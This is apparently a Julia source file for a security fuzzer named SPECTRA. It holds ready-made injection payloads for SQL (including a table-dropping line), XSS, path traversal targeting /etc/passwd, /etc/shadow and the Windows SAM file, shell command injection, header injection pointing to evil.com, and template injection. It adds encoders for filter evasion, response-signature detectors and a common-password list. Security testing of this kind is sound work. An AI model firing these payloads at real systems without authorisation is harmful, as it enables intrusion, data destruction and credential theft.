# ═══════════════════════════════════════════════════════════════════════════════
#                              SPECTRA - Fuzzer
# ═══════════════════════════════════════════════════════════════════════════════
# Security testing through fuzzing and payload generation
# ═══════════════════════════════════════════════════════════════════════════════

# ───────────────────────────────────────────────────────────────────────────────
#                              PAYLOAD DATABASES
# ───────────────────────────────────────────────────────────────────────────────

const SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT @@version--",
    "'; DROP TABLE users--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1 AND SLEEP(5)",
    "1' AND SLEEP(5)--",
    "1\" AND SLEEP(5)--",
    "BENCHMARK(10000000,SHA1('test'))",
]

const XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    "'-alert(1)//",
    "</script><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
]

const PATH_TRAVERSAL_PAYLOADS = [
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "..\\",
    "..\\..\\",
    "..%2f",
    "..%252f",
    "%2e%2e%2f",
    "%2e%2e/",
    "....//",
    "....\\\\",
    "../../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/passwd",
    "....//....//....//etc/passwd",
    "..%c0%af",
    "..%c1%9c",
]

const COMMAND_INJECTION_PAYLOADS = [
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "|| ls",
    "`ls`",
    "\$(ls)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; id",
    "| id",
    "& id",
    "; whoami",
    "| whoami",
    "; uname -a",
    "| uname -a",
    "\${IFS}cat\${IFS}/etc/passwd",
    ";sleep 5",
    "|sleep 5",
    "&sleep 5",
]

const HEADER_INJECTION_PAYLOADS = [
    "\\r\\nX-Injected: header",
    "%0d%0aX-Injected: header",
    "\\r\\nSet-Cookie: injected=true",
    "%0d%0aSet-Cookie: injected=true",
    "\\r\\n\\r\\n<html>injected</html>",
    "\\r\\nLocation: http://evil.com",
]

const SSTI_PAYLOADS = [
    "{{7*7}}",
    "\${7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "\${T(java.lang.Runtime).getRuntime()}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{request.application.__globals__.__builtins__}}",
    "#set(\$x=7*7)\${x}",
    "*{7*7}",
]

# ───────────────────────────────────────────────────────────────────────────────
#                              FUZZER CORE
# ───────────────────────────────────────────────────────────────────────────────

"""
    generate_payloads(category::Symbol; 
                      mutate::Bool = true,
                      encode::Vector{Symbol} = Symbol[])

Generate fuzzing payloads for a category.

# Categories
- `:sql` - SQL injection
- `:xss` - Cross-site scripting
- `:path` - Path traversal
- `:cmd` - Command injection
- `:header` - Header injection
- `:ssti` - Server-side template injection

# Arguments
- `category`: Payload category
- `mutate`: Apply mutations
- `encode`: Encoding types (:url, :html, :base64, :unicode)
"""
function generate_payloads(category::Symbol;
                           mutate::Bool = true,
                           encode::Vector{Symbol} = Symbol[])::Vector{String}
    
    base_payloads = if category == :sql
        SQL_PAYLOADS
    elseif category == :xss
        XSS_PAYLOADS
    elseif category == :path
        PATH_TRAVERSAL_PAYLOADS
    elseif category == :cmd
        COMMAND_INJECTION_PAYLOADS
    elseif category == :header
        HEADER_INJECTION_PAYLOADS
    elseif category == :ssti
        SSTI_PAYLOADS
    else
        String[]
    end
    
    payloads = copy(base_payloads)
    
    # Apply mutations
    if mutate
        mutated = String[]
        for payload in payloads
            push!(mutated, uppercase(payload))
            push!(mutated, lowercase(payload))
            push!(mutated, " " * payload)
            push!(mutated, payload * " ")
        end
        append!(payloads, mutated)
    end
    
    # Apply encodings
    for enc in encode
        encoded = String[]
        for payload in payloads
            push!(encoded, encode_payload(payload, enc))
        end
        append!(payloads, encoded)
    end
    
    return unique(payloads)
end

"""
    encode_payload(payload::String, encoding::Symbol)

Encode payload with specified encoding.
"""
function encode_payload(payload::String, encoding::Symbol)::String
    if encoding == :url
        return url_encode(payload)
    elseif encoding == :html
        return html_encode(payload)
    elseif encoding == :base64
        return base64encode(payload)
    elseif encoding == :unicode
        return unicode_encode(payload)
    elseif encoding == :double_url
        return url_encode(url_encode(payload))
    else
        return payload
    end
end

"""
    url_encode(s::String)

URL encode a string.
"""
function url_encode(s::String)::String
    result = IOBuffer()
    for char in s
        if isalnum(char) || char in "-_.~"
            write(result, char)
        else
            write(result, '%')
            write(result, uppercase(string(UInt8(char), base=16, pad=2)))
        end
    end
    return String(take!(result))
end

"""
    html_encode(s::String)

HTML encode a string.
"""
function html_encode(s::String)::String
    replacements = Dict(
        '<' => "&lt;",
        '>' => "&gt;",
        '&' => "&amp;",
        '"' => "&quot;",
        '\'' => "&#x27;",
    )
    
    result = s
    for (char, replacement) in replacements
        result = replace(result, char => replacement)
    end
    return result
end

"""
    unicode_encode(s::String)

Unicode encode a string.
"""
function unicode_encode(s::String)::String
    result = IOBuffer()
    for char in s
        write(result, "\\u" * lpad(string(UInt16(char), base=16), 4, '0'))
    end
    return String(take!(result))
end

# ───────────────────────────────────────────────────────────────────────────────
#                              MUTATION ENGINE
# ───────────────────────────────────────────────────────────────────────────────

"""
    mutate_string(s::String, mutation::Symbol)

Apply mutation to string.
"""
function mutate_string(s::String, mutation::Symbol)::String
    if mutation == :case_swap
        return join([isuppercase(c) ? lowercase(c) : uppercase(c) for c in s])
    elseif mutation == :random_case
        return join([rand(Bool) ? uppercase(c) : lowercase(c) for c in s])
    elseif mutation == :reverse
        return reverse(s)
    elseif mutation == :double
        return s * s
    elseif mutation == :null_byte
        return s * "\x00"
    elseif mutation == :newline
        return s * "\n"
    elseif mutation == :tab
        return s * "\t"
    elseif mutation == :space_pad
        return " " * s * " "
    else
        return s
    end
end

"""
    generate_mutations(base::String)

Generate all mutations of a base string.
"""
function generate_mutations(base::String)::Vector{String}
    mutations = [:case_swap, :random_case, :reverse, :double, 
                 :null_byte, :newline, :tab, :space_pad]
    
    results = [base]
    for m in mutations
        push!(results, mutate_string(base, m))
    end
    
    return results
end

# ───────────────────────────────────────────────────────────────────────────────
#                              PARAMETER FUZZING
# ───────────────────────────────────────────────────────────────────────────────

"""
    fuzz_parameter(name::String, value::String, payloads::Vector{String})

Generate fuzzed parameter variations.
"""
function fuzz_parameter(name::String, value::String, payloads::Vector{String})::Vector{Tuple{String, String}}
    results = Tuple{String, String}[]
    
    for payload in payloads
        # Replace value entirely
        push!(results, (name, payload))
        
        # Append to value
        push!(results, (name, value * payload))
        
        # Prepend to value
        push!(results, (name, payload * value))
    end
    
    return results
end

"""
    fuzz_url_params(url::String, category::Symbol; verbose::Bool = CONFIG.verbose)

Fuzz URL parameters with payloads.
"""
function fuzz_url_params(url::String, category::Symbol; verbose::Bool = CONFIG.verbose)::Vector{String}
    if verbose
        module_banner(:fuzzer)
        println(themed("[*] Fuzzing URL: $url", :info))
        println(themed("[*] Category: $category", :dim))
        println()
    end
    
    parsed = parse_url(url)
    base_url = "$(parsed[:scheme])://$(parsed[:host])"
    if parsed[:port] != (parsed[:scheme] == "https" ? 443 : 80)
        base_url *= ":$(parsed[:port])"
    end
    base_url *= parsed[:path]
    
    payloads = generate_payloads(category, mutate=false)
    fuzzed_urls = String[]
    
    if isempty(parsed[:query])
        # No params, add test parameter
        for payload in payloads
            encoded_payload = url_encode(payload)
            push!(fuzzed_urls, "$base_url?test=$encoded_payload")
        end
    else
        # Fuzz existing parameters
        params = Dict{String, String}()
        for param in split(parsed[:query], '&')
            if occursin('=', param)
                parts = split(param, '=', limit=2)
                params[parts[1]] = length(parts) > 1 ? parts[2] : ""
            end
        end
        
        for (name, value) in params
            for payload in payloads
                fuzzed_params = copy(params)
                fuzzed_params[name] = url_encode(payload)
                query = join(["$k=$v" for (k, v) in fuzzed_params], '&')
                push!(fuzzed_urls, "$base_url?$query")
            end
        end
    end
    
    verbose && println(themed("[*] Generated $(length(fuzzed_urls)) fuzzed URLs", :info))
    
    return fuzzed_urls
end

# ───────────────────────────────────────────────────────────────────────────────
#                              RESPONSE ANALYSIS
# ───────────────────────────────────────────────────────────────────────────────

const ERROR_SIGNATURES = Dict{Symbol, Vector{Regex}}(
    :sql => [
        r"SQL syntax.*?MySQL",
        r"Warning.*?\Wmysqli?",
        r"PostgreSQL.*ERROR",
        r"Warning.*?pg_",
        r"ORA-[0-9]+",
        r"Oracle error",
        r"Microsoft SQL Server",
        r"ODBC SQL Server Driver",
        r"SQLite.*?error",
        r"sqlite3",
        r"mysql_fetch",
        r"pg_connect",
    ],
    :xss => [
        r"<script>alert\(1\)</script>",
        r"<img src=x onerror=alert\(1\)>",
        r"<svg onload=alert\(1\)>",
    ],
    :path => [
        r"root:.*:0:0:",
        r"\[boot loader\]",
        r"include_path",
        r"failed to open stream",
        r"No such file or directory",
    ],
    :cmd => [
        r"uid=\d+.*gid=\d+",
        r"root:x:0:0",
        r"Linux version",
        r"COMMAND.COM",
        r"Volume Serial Number",
    ],
)

"""
    analyze_response(response::String, category::Symbol)

Analyze response for vulnerability indicators.
"""
function analyze_response(response::String, category::Symbol)::Dict{Symbol, Any}
    result = Dict{Symbol, Any}(
        :vulnerable => false,
        :indicators => String[],
        :confidence => 0.0
    )
    
    signatures = get(ERROR_SIGNATURES, category, Regex[])
    
    for sig in signatures
        if occursin(sig, response)
            result[:vulnerable] = true
            push!(result[:indicators], string(sig.pattern))
        end
    end
    
    result[:confidence] = isempty(result[:indicators]) ? 0.0 : 
                          min(1.0, length(result[:indicators]) * 0.3)
    
    return result
end

# ───────────────────────────────────────────────────────────────────────────────
#                              WORDLIST GENERATION
# ───────────────────────────────────────────────────────────────────────────────

"""
    generate_wordlist(; length_range::UnitRange{Int} = 1:8,
                       charset::Symbol = :alphanumeric,
                       count::Int = 1000)

Generate random wordlist for fuzzing.
"""
function generate_wordlist(; length_range::UnitRange{Int} = 1:8,
                             charset::Symbol = :alphanumeric,
                             count::Int = 1000)::Vector{String}
    
    chars = if charset == :alphanumeric
        vcat(collect('a':'z'), collect('A':'Z'), collect('0':'9'))
    elseif charset == :alpha
        vcat(collect('a':'z'), collect('A':'Z'))
    elseif charset == :numeric
        collect('0':'9')
    elseif charset == :hex
        vcat(collect('0':'9'), collect('a':'f'))
    elseif charset == :special
        collect("!@#\$%^&*()_+-=[]{}|;':\",./<>?")
    else
        collect('a':'z')
    end
    
    words = String[]
    for _ in 1:count
        len = rand(length_range)
        word = String([chars[rand(1:length(chars))] for _ in 1:len])
        push!(words, word)
    end
    
    return unique(words)
end

"""
    common_passwords()

Return list of common passwords for testing.
"""
function common_passwords()::Vector{String}
    return [
        "password", "123456", "12345678", "qwerty", "abc123",
        "monkey", "1234567", "letmein", "trustno1", "dragon",
        "baseball", "iloveyou", "master", "sunshine", "ashley",
        "bailey", "passw0rd", "shadow", "123123", "654321",
        "superman", "qazwsx", "michael", "football", "password1",
        "password123", "batman", "login", "admin", "root",
        "welcome", "hello", "charlie", "donald", "loveme",
        "admin123", "administrator", "test", "test123", "guest",
    ]
end
